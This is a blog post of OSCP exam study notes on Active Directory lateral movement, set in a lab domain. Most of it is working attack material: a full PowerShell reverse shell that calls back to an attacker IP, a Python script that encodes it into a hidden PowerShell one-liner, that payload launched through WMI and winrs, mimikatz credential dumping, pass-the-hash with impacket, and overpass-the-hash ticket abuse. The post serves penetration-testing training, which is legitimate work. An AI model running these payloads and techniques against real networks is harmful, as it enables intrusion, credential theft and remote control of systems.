---
title: Lateral Movement in Active Directory
date: 2024-04-023 02:14:00 -0600
categories: [OSCP]
tags: [oscp, pen200, offsec, certs]     # TAG names should always be lowercase
---
*The Lateral Movement in Active Directory tools and tactics reviewed here are presented specifically in preparation for the OSCP exam per course suggestions and are by no means replacements for the OSCP training course, nor comprehensive guides for this step in the Kill Chain.*

# Lateral Movement in Active Directory

Let's explore different lateral movement techniques that allow us to authenticate to a system and gain code execution using a user's hash or a Kerberos ticket.

## Active Directory Lateral Movement Techniques

### WMI and WinRM

Windows Management Instrumentation (WMI) facilitates task automation and can use the Create method from the Win32_Process class. It communicates thru Remote Procedure Calls (RPC) over port 135 for remote access and uses a higher-range port (19152-65535) for session data.

To create a process on the remote target via WMI, we need the credentials of a member of the Administrators local group, which can also be a domain user.

```console
kali$ xfreerdp /cert-ignore /u:jeff /d:corp.com /v:192.168.177.74 /drive:shared,/tmp

// test, launch calculator

jeff> wmic /node:192.168.177.73 /user:jen /password:Nexus123! process call create "calc"
Executing (Win32_Process)->Create()
Method execution successful.
Out Parameters:
instance of __PARAMETERS
{
        ProcessId = 2100;
        ReturnValue = 0;
};

// If we were logged in on that machine and monitoring Task Manager we would see the win32calc.exe process appear with jen as the user.

jeff> $username = 'jen';
$password = 'Nexus123!';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;

// create CIM using target IP

jeff> $options = New-CimSessionOption -Protocol DCOM
$session = New-Cimsession -ComputerName 192.168.177.73 -Credential $credential -SessionOption $Options 
$command = 'calc';

jeff> Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};
ProcessId ReturnValue PSComputerName
--------- ----------- --------------
     1384           0 192.168.177.73

// verify the process is running on the target machine with Task Maanger
```

We can improve this by replacing this payload with a full reverse shell. Replace the IP with the IP and port of the Kali attacker machine.

```
import sys
import base64

payload = '$client = New-Object System.Net.Sockets.TCPClient("192.168.45.226",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'

cmd = "powershell -nop -w hidden -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()

print(cmd)
```

Save this Python script in Kali.

```console
kali$ nano encode.py
import sys
import base64

payload = '$client = New-Object System.Net.Sockets.TCPClient("192.168.45.226",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'

cmd = "powershell -nop -w hidden -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()

print(cmd)

kali$ python3 encode.py
powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADIAMgA2ACIALAA0ADQAMwApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=

// set up listener

$ nc -nlvp 443

PS C:\Users\jeff> $username = 'jen';
PS C:\Users\jeff> $password = 'Nexus123!';
PS C:\Users\jeff> $secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
PS C:\Users\jeff> $credential = New-Object System.Management.Automation.PSCredential $username, $secureString;

PS C:\Users\jeff> $Options = New-CimSessionOption -Protocol DCOM
PS C:\Users\jeff> $Session = New-Cimsession -ComputerName 192.168.177.73 -Credential $credential -SessionOption $Options

PS C:\Users\jeff> $Command = 'powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADIAMgA2ACIALAA0ADQAMwApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA='
...

PS C:\Users\jeff> Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};

kali$ nc -nlvp 443           
listening on [any] 443 ...
connect to [192.168.45.226] from (UNKNOWN) [192.168.177.73] 55087
hostname
FILES04
PS C:\Windows\system32> whoami
corp\jen
PS C:\Windows\system32> 
```

As an alternative method to WMI for remote management, WinRM can be employed for remote host management. WinRM is the Microsoft version of the WS-Management protocol and it exchanges XML messages over HTTP and HTTPS. It uses TCP port 5986 for encrypted HTTPS traffic and port 5985 for plain HTTP. In addition to its PowerShell implementation, which we'll cover later in this section, WinRM is implemented in numerous built-in utilities, such as winrs (Windows Remote Shell).

NOTE: For WinRS to work, the domain user needs to be part of the Administrators or Remote Management Users group on the target host.

```console
jeff> winrs -r:files04 -u:jen -p:Nexus123!  "cmd /c hostname & whoami"
FILES04
corp\jen

// that confirmed we can run commands remotely on FILES04
// now try lateral movement

jeff> winrs -r:files04 -u:jen -p:Nexus123!  "powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADIAMgA2ACIALAA0ADQAMwApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA="

kali$ nc -nlvp 443
listening on [any] 443 ...
connect to [192.168.45.226] from (UNKNOWN) [192.168.177.73] 55089
hostname
FILES04
PS C:\Users\jen> whoami
corp\jen
PS C:\Users\jen> 
```

PowerShell also has WinRM built-in capabilities called PowerShell remoting, which can be invoked via the New-PSSession cmdlet by providing the IP of the target host along with the credentials in a credential object format similar to what we did previously.

```console
PS C:\Users\jeff> $username = 'jen';
PS C:\Users\jeff> $password = 'Nexus123!';
PS C:\Users\jeff> $secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
PS C:\Users\jeff> $credential = New-Object System.Management.Automation.PSCredential $username, $secureString;

PS C:\Users\jeff> New-PSSession -ComputerName 192.168.177.73 -Credential $credential

 Id Name            ComputerName    ComputerType    State         ConfigurationName     Availability
 -- ----            ------------    ------------    -----         -----------------     ------------
  1 WinRM1          192.168.177.73  RemoteMachine   Opened        Microsoft.PowerShell     Available

PS C:\Users\jeff> Enter-PSSession 1
[192.168.177.73]: PS C:\Users\jen\Documents> whoami
corp\jen
[192.168.177.73]: PS C:\Users\jen\Documents> hostname
FILES04
```

### PsExec

PsExec is part of SysInternals intended to replace telnet-like apps and provide remote execution of processes on other systems thru an interactive console. To use for lateral movement:

1. User that authenticates to the target needs to be part of the Administrators local group
2. ADMIN$ share must be available
3. File and Printer Sharing must be turned on

The last two requirements are default for Windows Servers.

NOTE: you should avoid using the domain flag (-d) for RDP if the user has local admin privileges.

You probably need to transfer PsExec onto the compromised machine.

```console
// start an interactive session on the remote host

PS C:\Tools\SysinternalsSuite> ./PsExec64.exe -i  \\FILES04 -u corp\jen -p Nexus123! cmd
PsExec v2.4 - Execute processes remotely
Copyright (C) 2001-2022 Mark Russinovich
Sysinternals - www.sysinternals.com


Microsoft Windows [Version 10.0.20348.169]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>hostname
FILES04

C:\Windows\system32>whoami
corp\jen
```

### Pass the Hash

Note that this will only work for servers or services using NTLM authentication, not for servers or services using Kerberos authentication.

Many third-party tools and frameworks use PtH to allow users to both authenticate and obtain code execution, including:
- PsExec from Metasploit
- Passing-the-hash toolkit
- Impacket

Three requirements:
1. Need an SMB connection thru the firewall (often port 445)
2. Windows File and Printer Sharing feature needs to be enabled
3. ADMIN$ share must be available

We are going to invoke the command by passing the local Administrator hash that we gathered previously.

```console
kali$ /usr/bin/impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.177.73
Impacket v0.11.0 - Copyright 2023 Fortra

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>hostname
FILES04

C:\>whoami
files04\administrator
```

If the target was sitting behind a network that was only reachable through our initial compromised access, we could perform this very same attack by pivoting and proxying through the first host as learned previously.

This method works for Active Directory domain accounts and the built-in local administrator account. However, due to the 2014 security update, this technique can not be used to authenticate as any other local admin account.

### Overpass the Hash

With overpass the hash, we can "over" abuse an NTLM user hash to gain a full Kerberos Ticket Granting Ticket (TGT). Then we can use the TGT to obtain a Ticket Granting Service (TGS).

Assume you already compromised a workstation or server that jen has authenticated too, so the machine is now caching her creds and NTLM password hash. We'll log in to the Windows 10 CLIENT76 machine as jeff and run a process as jen, which prompts authentication.

Shift + right click the Notepad icon on the desktop and Run As Different User. After you auth, jen's creds are cached on the machine.

```console
// enter Admin PS
PS> .\mimikatz.exe

mimikatz# privilege::debug
mimikatz# sekurlsa::logonpasswords
[00000003] Primary
         * Username : jen
         * Domain   : CORP
         * NTLM     : 369def79d8372408bf6e93364cc93075

// turn jen's NTLM hash into a kerberos ticket

mimikatz# sekurlsa::pth /user:jen /domain:corp.com /ntlm:369def79d8372408bf6e93364cc93075 /run:powershell
user    : jen
domain  : corp.com
program : powershell
impers. : no
NTLM    : 369def79d8372408bf6e93364cc93075
  |  PID  2824
  |  TID  4584
  |  LSA Process is now R/W
  |  LUID 0 ; 2162675 (00000000:0020fff3)
  \_ msv1_0   - data copy @ 000002105B112E10 : OK !
  \_ kerberos - data copy @ 000002105B1F84F8
   \_ aes256_hmac       -> null
   \_ aes128_hmac       -> null
   \_ rc4_hmac_nt       OK
   \_ rc4_hmac_old      OK
   \_ rc4_md4           OK
   \_ rc4_hmac_nt_exp   OK
   \_ rc4_hmac_old_exp  OK
   \_ *Password replace @ 000002105B27CDA8 (32) -> null
```

A new PowerShell window should open as jen. At this point, running the whoami command on the newly created PowerShell session would show jeff's identity instead of jen. While this could be confusing, this is the intended behavior of the whoami utility which only checks the current process's token and does not inspect any imported Kerberos tickets

In the new jen shell:

```console
PS> klist

Current LogonId is 0:0x20fff3

Cached Tickets: (0)

// no cached tickets yet, generate a TGT by authenticating to a network share

PS> net use \\files04

PS> klist
Current LogonId is 0:0x20fff3

Cached Tickets: (2)

#0>     Client: jen @ CORP.COM
        Server: krbtgt/CORP.COM @ CORP.COM
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
        Start Time: 4/23/2024 16:42:13 (local)
        End Time:   4/24/2024 2:42:13 (local)
        Renew Time: 4/30/2024 16:42:13 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called: DC1.corp.com

#1>     Client: jen @ CORP.COM
        Server: cifs/files04 @ CORP.COM
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40a10000 -> forwardable renewable pre_authent name_canonicalize
        Start Time: 4/23/2024 16:42:13 (local)
        End Time:   4/24/2024 2:42:13 (local)
        Renew Time: 4/30/2024 16:42:13 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0
        Kdc Called: DC1.corp.com
```

The output has the Kerberos tickets, including the TGT and a TGS for the Common Internet File System (CIFS) service. We used net use arbitrarily in this example, but we could have used any command that requires domain permissions and would subsequently create a TGS.

We know that ticket #0 is a TGT because the server is krbtgt.

Now we can use any tools that rely on Kerberos instead of NTLM.

PsExec can run a command remotely but does not accept password hashes. Since we have generated Kerberos tickets and operate in the context of jen in the PowerShell session, we can reuse the TGT to obtain code execution on the files04 host.

```console
PS> cd C:\tools\SysinternalsSuite\

PS> .\PsExec.exe \\files04 cmd

PsExec v2.4 - Execute processes remotely
Copyright (C) 2001-2022 Mark Russinovich
Sysinternals - www.sysinternals.com


Microsoft Windows [Version 10.0.20348.169]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
corp\jen

C:\Windows\system32>hostname
FILES04
```

We have successfully reused the Kerberos TGT to launch a command shell on the files04 server.
